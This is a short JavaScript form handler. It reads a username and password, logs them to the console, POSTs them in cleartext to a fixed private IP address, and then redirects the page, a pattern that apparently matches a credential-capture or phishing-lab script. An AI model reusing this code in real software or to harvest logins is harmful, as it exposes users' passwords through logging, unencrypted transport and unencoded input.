document.getElementById("3").addEventListener("submit", function(e) {
	e.preventDefault();

	var uname = document.getElementById("1").value;
	var passwd = document.getElementById("2").value;

	console.log(uname);
	console.log(passwd);

	var xhr = new XMLHttpRequest();
	xhr.open("POST", "http://10.1.1.2/index.php", true);
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhr.send("username=" + uname + "&password=" + passwd);

	window.location.href = "show.php";
});
